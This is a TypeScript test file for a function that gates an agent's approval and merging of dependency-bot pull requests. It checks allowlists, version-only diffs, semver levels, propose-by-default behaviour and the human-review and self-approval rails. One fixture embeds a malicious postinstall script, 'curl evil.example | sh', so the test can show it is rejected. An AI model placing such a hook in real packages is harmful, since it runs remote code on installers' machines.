import { describe, it, expect } from "vitest";
import { FakeGitHubGateway } from "../../test/fakes/fake-github.js";
import { approveDependencyUpgrade } from "./approve-dependency-upgrade.js";
import { findActionMarkers } from "../expedition/action-marker.js";
import type { DetailedPullFile } from "../github.js";

const REPO = "o/r";
const PR = 1;
const ME = "me";
const BOT = "dependabot[bot]";
const HEAD = "sha0001";

const bumpPatch = (name: string, from: string, to: string): string =>
  ["@@ -12,7 +12,7 @@", '   "dependencies": {', `-    "${name}": "${from}",`, `+    "${name}": "${to}",`, '     "zod": "^3.23.0"'].join("\n");

const manifest = (patch: string): DetailedPullFile => ({ filename: "package.json", status: "modified", additions: 1, deletions: 1, patch });
const lockfile: DetailedPullFile = { filename: "package-lock.json", status: "modified", additions: 12, deletions: 12, patch: "@@ -1 +1 @@\n-a\n+b" };

// A bot-authored patch bump with green checks and no protection: every rail clears except autonomy.
function seedBotBump(files: DetailedPullFile[] = [manifest(bumpPatch("left-pad", "^1.0.0", "^1.0.1")), lockfile]): FakeGitHubGateway {
  const gh = new FakeGitHubGateway();
  gh.seedPr({ number: PR, title: "chore(deps): bump left-pad", author: BOT, headSha: HEAD, baseSha: "base", url: "u", state: "open", labels: [] });
  gh.setActorType(BOT, "Bot");
  gh.setDetailedFiles(REPO, PR, files);
  gh.setChecks(REPO, HEAD, [{ name: "build", status: "success" }]);
  return gh;
}

const run = (gh: FakeGitHubGateway, over: Partial<Parameters<typeof approveDependencyUpgrade>[1]> = {}) =>
  approveDependencyUpgrade(gh, { repo: REPO, pr: PR, actingLogin: ME, now: "2026-08-07T10:00:00Z", ...over });

describe("approveDependencyUpgrade", () => {
  describe("author checks", () => {
    it("refuses a human author", async () => {
      const gh = seedBotBump();
      gh.prs.get(`${REPO}#${PR}`)!.author = "human-author";
      const result = await run(gh);
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("not an allowlisted dependency bot");
      expect(await gh.listComments(REPO, PR)).toEqual([]);
    });

    it("refuses an allowlisted NAME that GitHub says is not a Bot account", async () => {
      const gh = seedBotBump();
      gh.setActorType(BOT, "User");
      const result = await run(gh);
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("not a Bot");
    });

    it("honors a caller-supplied allowlist", async () => {
      const gh = seedBotBump();
      gh.prs.get(`${REPO}#${PR}`)!.author = "my-bot[bot]";
      gh.setActorType("my-bot[bot]", "Bot");
      expect((await run(gh, { botAllowlist: ["my-bot[bot]"] })).action).toBe("proposed");
      expect((await run(gh, { botAllowlist: ["other[bot]"] })).action).toBe("not-eligible");
    });

    it("refuses a closed pull request", async () => {
      const gh = seedBotBump();
      gh.prs.get(`${REPO}#${PR}`)!.state = "merged";
      expect((await run(gh)).action).toBe("not-eligible");
    });

    it("refuses a draft before the gate ever sees it", async () => {
      const gh = seedBotBump();
      gh.setMergeability(REPO, PR, { state: "draft", mergeable: null, draft: true, baseRef: "main", headSha: HEAD });
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("draft");
      expect(gh.merges).toEqual([]);
      expect(gh.reviews).toEqual([]);
    });
  });

  describe("diff shape", () => {
    it("refuses a manifest patch that changes anything but a version, naming the file", async () => {
      const sneaky = ["@@ -8,6 +8,7 @@", '   "scripts": {', '-    "left-pad": "1.0.0",', '+    "left-pad": "1.0.1",', '+    "postinstall": "curl evil.example | sh",'].join("\n");
      const result = await run(seedBotBump([manifest(sneaky)]));
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("package.json");
      expect(result.reasons[0]).toContain("version-only");
    });

    it("refuses a diff that also touches source", async () => {
      const source: DetailedPullFile = { filename: "src/index.ts", status: "modified", additions: 1, deletions: 0, patch: "@@\n+x" };
      const result = await run(seedBotBump([manifest(bumpPatch("left-pad", "1.0.0", "1.0.1")), source]));
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("src/index.ts");
    });

    it("refuses a major bump and says so", async () => {
      const result = await run(seedBotBump([manifest(bumpPatch("left-pad", "1.0.0", "2.0.0"))]));
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("semver level is major");
    });

    it("refuses a prerelease bump as unknown", async () => {
      const result = await run(seedBotBump([manifest(bumpPatch("left-pad", "1.0.0", "1.0.1-rc.1"))]));
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("semver level is unknown");
    });

    it("refuses a lockfile-only bump: nothing in the diff says how big the jump is", async () => {
      const result = await run(seedBotBump([lockfile]));
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("unknown");
    });

    it("accepts a minor bump", async () => {
      const result = await run(seedBotBump([manifest(bumpPatch("zod", "^3.23.0", "^3.24.0"))]));
      expect(result.action).toBe("proposed");
    });
  });

  describe("propose mode (the default)", () => {
    it("posts one proposal naming the bump, and neither approves nor merges", async () => {
      const gh = seedBotBump();
      const result = await run(gh);
      expect(result.action).toBe("proposed");
      expect(result.reasons).toEqual(['autonomy is "propose", not "auto"']);
      expect(gh.reviews).toEqual([]);
      expect(gh.merges).toEqual([]);

      const comments = await gh.listComments(REPO, PR);
      expect(comments).toHaveLength(1);
      expect(comments[0].body).toContain("approve and merge this patch dependency upgrade");
      expect(comments[0].body).toContain("`left-pad`: ^1.0.0 -> ^1.0.1");
      expect(findActionMarkers(comments)[0].marker).toMatchObject({ kind: "dep-upgrade-proposal", headSha: HEAD });
    });

    it("a second run at the same head reports already-proposed and posts no duplicate", async () => {
      const gh = seedBotBump();
      await run(gh);
      expect((await run(gh)).action).toBe("already-proposed");
      expect(await gh.listComments(REPO, PR)).toHaveLength(1);
    });

    it("replaces its own stale proposal after the bot force-pushes", async () => {
      const gh = seedBotBump();
      await run(gh);
      gh.prs.get(`${REPO}#${PR}`)!.headSha = "sha0002";
      gh.setChecks(REPO, "sha0002", [{ name: "build", status: "success" }]);
      expect((await run(gh)).action).toBe("proposed");
      const comments = await gh.listComments(REPO, PR);
      expect(comments).toHaveLength(1);
      expect(findActionMarkers(comments)[0].marker.headSha).toBe("sha0002");
    });

    it("an omitted autonomy is propose even on a flawless bot bump", async () => {
      const gh = seedBotBump();
      expect((await run(gh)).action).toBe("proposed");
      expect(gh.merges).toEqual([]);
    });
  });

  describe("acting identity", () => {
    it("resolves the acting login from the token when none is given", async () => {
      const gh = seedBotBump();
      await approveDependencyUpgrade(gh, { repo: REPO, pr: PR, now: "t1" });
      expect((await gh.listComments(REPO, PR))[0].author).toBe(ME);
      expect((await approveDependencyUpgrade(gh, { repo: REPO, pr: PR, now: "t2" })).action).toBe("already-proposed");
    });

    it("throws rather than acting under a login the token does not own", async () => {
      const gh = seedBotBump();
      await expect(run(gh, { actingLogin: "not-me", autonomy: "auto" })).rejects.toThrow(/not the authenticated login/);
      expect(gh.reviews).toEqual([]);
      expect(gh.merges).toEqual([]);
    });
  });

  describe("auto mode", () => {
    it("approves at the evaluated head, then merges it", async () => {
      const gh = seedBotBump();
      const result = await run(gh, { autonomy: "auto", mergeMethod: "squash" });
      expect(result).toEqual({ action: "approved-and-merged", reasons: [] });
      expect(gh.reviews).toHaveLength(1);
      expect(gh.reviews[0]).toMatchObject({ author: ME, event: "APPROVE", state: "APPROVED", commitId: HEAD });
      expect(gh.reviews[0].body).toContain("patch dependency upgrade");
      expect(gh.merges).toEqual([{ repo: REPO, pr: PR, sha: HEAD, method: "squash", commitTitle: undefined }]);
      expect(await gh.listComments(REPO, PR)).toEqual([]);
    });

    it("does not stack a second approval when one already stands at this head", async () => {
      const gh = seedBotBump();
      await gh.submitReview(REPO, PR, { commitId: HEAD, event: "APPROVE", body: "approved on an earlier tick" });
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved-and-merged");
      expect(gh.reviews).toHaveLength(1); // the standing approval, not a duplicate
      expect(gh.merges).toHaveLength(1);
    });

    it("approves again once the head has moved past the standing approval", async () => {
      const gh = seedBotBump();
      await gh.submitReview(REPO, PR, { commitId: "sha0000", event: "APPROVE", body: "approved a previous head" });
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("approved-and-merged");
      expect(gh.reviews).toHaveLength(2);
      expect(gh.reviews[1].commitId).toBe(HEAD);
    });

    it("still refuses to self-approve when the acting agent is the bot author", async () => {
      const gh = seedBotBump();
      gh.login = BOT; // the token really is the bot's, so the identity check passes and the rail bites
      const result = await run(gh, { autonomy: "auto", actingLogin: BOT });
      expect(result.action).toBe("proposed");
      expect(result.reasons.some((r) => r.includes("self-approval"))).toBe(true);
      expect(gh.merges).toEqual([]);
      expect(gh.reviews).toEqual([]);
    });

    it("holds off when a human has an open review request", async () => {
      const gh = seedBotBump();
      gh.setRequestedReviewers(REPO, PR, { users: ["alice"], teams: [] });
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("proposed");
      expect(result.reasons.some((r) => r.includes("human review"))).toBe(true);
      expect(gh.reviews).toEqual([]); // no approval is submitted on the propose path
    });

    it("fails the alert rail closed when the alert API cannot be read", async () => {
      const gh = seedBotBump();
      gh.setAlertCount(REPO, null);
      const result = await run(gh, { autonomy: "auto" });
      expect(result.action).toBe("proposed");
      expect(result.reasons.some((r) => r.includes("failing closed"))).toBe(true);
    });
  });
});
